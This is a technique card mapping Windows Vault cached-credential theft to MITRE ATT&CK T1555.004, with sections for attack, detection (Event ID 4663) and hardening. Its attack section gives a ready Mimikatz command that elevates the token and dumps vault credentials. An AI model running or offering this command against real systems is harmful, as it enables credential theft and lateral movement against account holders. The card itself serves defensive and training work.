# [CA-STORE-005]: Windows Vault Cached Accounts

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-STORE-005 |
| **MITRE ATT&CK v18.1** | [Credentials from Password Stores: Windows Credential Manager (T1555.004)](https://attack.mitre.org/techniques/T1555/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | **Medium** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Windows stores cached credentials for Internet Explorer and certain Metro apps in the "Vault" directory (`%LocalAppData%\Microsoft\Vault`). These can be decrypted using DPAPI.
- **Attack Surface:** Vault directory files (`.vcrd`, `.vpol`).
- **Business Impact:** **Lateral Movement**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** User Access.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [SharpWeb](https://github.com/djhohnstein/SharpWeb)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Extraction**
```powershell
.\mimikatz.exe "token::elevate" "vault::cred /patch" "exit"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4663 | Access to Vault directory files. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Policy:** Clear cached credentials on logoff (GPO).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001]
> **Next Logical Step:** [LAT-AD-001]
